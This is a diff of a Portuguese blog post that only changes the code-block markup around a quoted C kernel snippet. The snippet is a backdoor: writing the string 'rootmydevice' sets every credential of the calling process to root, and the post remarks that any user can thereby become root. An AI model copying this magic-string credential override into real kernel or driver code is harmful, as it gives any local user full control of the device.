@@ -10,20 +10,20 @@ Isso pode acontecer com todo mundo, apesar de ser nada legal. Veja o que o pesso
 
 <!-- more -->
 
-```C
-	if(!strncmp("rootmydevice",(char*)buf,12)){
-		cred = (struct cred *)__task_cred(current);
-		cred->uid = 0;
-		cred->gid = 0;
-		cred->suid = 0;
-		cred->euid = 0;
-		cred->euid = 0;
-		cred->egid = 0;
-		cred->fsuid = 0;
-		cred->fsgid = 0;
-		printk("now you are root\n");
-	}
-```
+{% highlight C %}
+if(!strncmp("rootmydevice",(char*)buf,12)){
+	cred = (struct cred *)__task_cred(current);
+	cred->uid = 0;
+	cred->gid = 0;
+	cred->suid = 0;
+	cred->euid = 0;
+	cred->euid = 0;
+	cred->egid = 0;
+	cred->fsuid = 0;
+	cred->fsgid = 0;
+	printk("now you are root\n");
+}
+{% endhighlight %}
 
 Isso permite que qualquer usuário em qualquer processo se torne root do dispositivo. <Insira uma cara de espanto aqui>
 
